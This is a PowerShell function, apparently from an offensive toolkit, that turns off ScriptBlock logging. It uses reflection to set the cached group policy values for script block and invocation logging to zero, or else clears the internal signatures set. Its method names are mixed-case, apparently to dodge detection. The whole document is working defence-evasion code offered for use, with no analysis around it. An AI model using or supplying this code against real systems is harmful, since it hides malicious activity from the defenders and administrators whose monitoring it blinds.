function Disable-ScriptBlock-Logging {

  <#
      .SYNOPSIS
          Function to disable Powershell ScriptBlock Logging introduced in Powershell v5.
          It prevents the recording of de-obfuscated PowerShell code.
  #>

  $GPF=[rEf].AssembLY.GETTyPe('System.Management.Automation.Utils')."GETField"('cachedGroupPolicySettings','NonPublic,Static');
  If ($GPF) {
    $GPC=$GPF.GeTVAlUe($NuLl);
    IF ($GPC['ScriptBlockLogging']) {
      $GPC['ScriptBlockLogging']['EnableScriptBlockLogging']=0;
      $GPC['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0
    }
    $VAL=[CollEcTioNs.GeNEric.DIcTiOnARy[stRiNg,SysTem.OBJect]]::new();
    $VAL.ADD('EnableScriptBlockLogging',0);
    $VAL.AdD('EnableScriptBlockInvocationLogging',0);
    $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']=$val
  }
  ELSE {
    [SCriPtBlOCk]."GEtFIElD"('signatures','NonPublic,Static').SETValue($NuLL,(New-OBjECt COllectIoNs.GeNeRIC.HasHSet[sTRINg]))
  }
}
